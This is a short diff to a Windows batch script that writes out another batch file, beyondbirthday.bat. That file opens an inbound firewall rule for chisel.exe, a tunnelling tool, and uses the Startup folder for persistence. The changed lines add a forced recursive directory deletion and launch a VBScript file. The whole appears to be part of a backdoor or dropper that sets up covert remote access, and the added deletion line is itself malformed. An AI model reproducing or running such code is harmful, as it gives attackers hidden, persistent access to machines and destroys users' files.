@@ -14,4 +14,5 @@ echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %homedrive%\Akuma\
 echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
 echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
 echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
-echo start %homedrive%\A7uma\Akuma.bat >> %homedrive%\Akuma\beyondbirthday.bat 
+echo del rmdir /s /q homedrive%\A7uma >> %homedrive%\Akuma\beyondbirthday.bat
+start %homedrive%\Akuma\beyondbirthday.vbs
